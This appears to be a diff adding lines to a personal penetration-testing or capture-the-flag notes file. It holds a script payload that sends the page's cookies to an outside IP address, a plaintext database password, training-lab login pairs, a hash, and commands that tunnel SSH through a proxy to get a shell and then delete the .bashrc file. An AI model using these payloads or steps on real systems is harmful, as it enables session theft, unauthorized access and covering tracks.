@@ -107,6 +107,20 @@ mysql -u admin -h localhost --password=kEjdbRigfBHUREiNSDs -D admin
 
 
 
+	<script>
+	document.write('<img src="http://35.227.24.107/7181c58a9a/index.php?c='+document.cookie+'" />');
+	</script>
 
+
+eccbc87e4b5ce2fe28308fd9f2a7baf3
+
+
+
+    Your credentials: wiener:peter
+    Victim's credentials carlos:montoya
+
+
+proxytunnel -p 192.168.2.4:3128 -d 127.0.0.1:22 -a 1234 
+sudo ssh user@127.0.0.1 -p 1234 /bin/bash : if bashrc does not allow stable shell. After getting stable shell with this command delete .bashrc file.
 
 
